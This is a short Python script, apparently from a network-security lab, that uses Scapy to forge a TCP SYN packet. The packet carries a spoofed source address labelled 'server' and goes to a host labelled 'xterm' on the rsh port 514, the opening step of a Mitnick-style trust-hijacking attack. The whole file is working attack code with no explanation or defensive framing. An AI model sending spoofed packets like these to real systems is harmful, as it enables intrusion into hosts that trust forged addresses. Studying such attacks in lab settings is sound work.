#!/usr/bin/python3
from scapy.all import *
'''
server 10.9.0.6
xterm 10.9.0.5
myself 10.9.0.7
'''

tcp=TCP()
tcp.sport=1023
tcp.dport=514
tcp.flags="S"
ip=IP()
ip.src="10.9.0.6"
ip.dst="10.9.0.5"
p=ip/tcp
if tcp.flags=="S":
    send(p)